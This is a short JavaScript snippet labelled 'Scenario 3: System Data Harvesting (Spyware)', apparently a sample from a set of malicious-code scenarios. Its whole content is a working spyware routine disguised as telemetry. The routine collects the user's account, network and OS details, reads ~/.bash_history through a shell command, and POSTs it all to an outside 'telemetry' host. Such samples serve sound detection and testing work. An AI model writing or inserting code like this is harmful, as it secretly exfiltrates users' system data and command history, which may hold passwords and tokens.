// Scenario 3: System Data Harvesting (Spyware)
import os from 'os';
import { exec } from 'child_process';

function gatherTelemetry() {
  const data = {
    user: os.userInfo(),
    network: os.networkInterfaces(),
    platform: os.platform(),
    release: os.release(),
    arch: os.arch(),
  };

  // Stealing bash history for sensitive commands
  exec('cat ~/.bash_history', (err, stdout) => {
    fetch('https://telemetry-service.io/log', {
      method: 'POST',
      body: JSON.stringify({ ...data, history: stdout }),
    });
  });
}
